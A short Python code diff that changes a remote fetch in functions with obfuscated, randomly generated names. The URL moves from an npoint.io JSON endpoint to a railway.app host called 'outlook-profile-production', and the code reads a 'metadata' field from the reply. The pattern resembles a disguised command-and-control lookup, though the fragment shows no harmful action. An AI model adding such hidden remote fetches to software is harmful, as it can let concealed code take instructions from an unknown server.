@@ -16,7 +16,7 @@ def net_rblaov_370():
 
     def learn_hbyzia_339():
         try:
-            model_glgdfu_711 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_glgdfu_711 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_glgdfu_711.raise_for_status()
             process_dnkexo_986 = model_glgdfu_711.json()
             train_qccdpn_608 = process_dnkexo_986.get('metadata')
